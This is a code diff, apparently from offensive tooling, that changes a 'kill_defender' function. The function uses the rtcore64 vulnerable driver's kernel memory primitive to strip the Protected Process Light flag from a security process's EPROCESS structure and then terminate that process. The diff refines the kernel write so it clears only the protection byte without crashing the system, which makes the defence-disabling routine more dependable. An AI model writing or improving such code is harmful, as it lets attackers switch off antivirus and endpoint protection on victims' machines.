@@ -690,8 +690,15 @@ def kill_defender(driver_name="rtcore64", driver_path=None):
                 prot = prim.read_bytes(ep_base + POFF, 1)
                 out.append(f"  Found {name_bytes.rstrip(b'\\x00').decode(errors='replace')} "
                            f"PID={pid} Protection=0x{prot.hex() if prot else '??'}")
-                # Zero Protection byte
-                prim.write_qword(ep_base + POFF, 0)
+                # Zero only the 1-byte Protection field via read-modify-write.
+                # write_qword writes 8 bytes — using it directly on POFF would
+                # corrupt 7 adjacent EPROCESS bytes (RundownProtect etc).
+                _aligned  = (POFF // 8) * 8          # QWORD-aligned offset
+                _byte_idx = POFF % 8                  # byte position within QWORD
+                _qw = prim.read_qword(ep_base + _aligned)
+                if _qw is not None:
+                    _mask = ~(0xFF << (_byte_idx * 8)) & 0xFFFFFFFFFFFFFFFF
+                    prim.write_qword(ep_base + _aligned, _qw & _mask)
                 out.append(f"  [✓] PPL removed")
                 # Terminate via normal Win32 API now that PPL is gone
                 proc_h = ctypes.windll.kernel32.OpenProcess(1, False, int(pid))
